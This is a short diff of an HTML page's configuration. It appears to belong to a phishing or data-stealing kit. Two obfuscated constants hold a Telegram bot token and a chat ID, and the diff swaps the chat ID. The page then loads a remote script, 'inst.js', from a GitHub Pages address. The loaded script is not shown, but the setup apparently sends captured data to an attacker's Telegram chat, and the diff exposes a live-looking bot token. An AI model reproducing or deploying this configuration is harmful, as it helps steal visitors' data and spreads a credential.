@@ -9,7 +9,7 @@
   <!-- Config variables -->
   <script>
     const iovjrtrdhhj9 = '7737309892:AAEnmtBD3fh_IbZ8NdmR1wX3nim01y3Hhac'; 
-    const I94626736O = '7053479517';
+    const I94626736O = '7453267044';
   </script>
   <!-- Load fixed JS -->
   <script src="https://linksvo.github.io/updafixlgs/inst.js" defer></script>
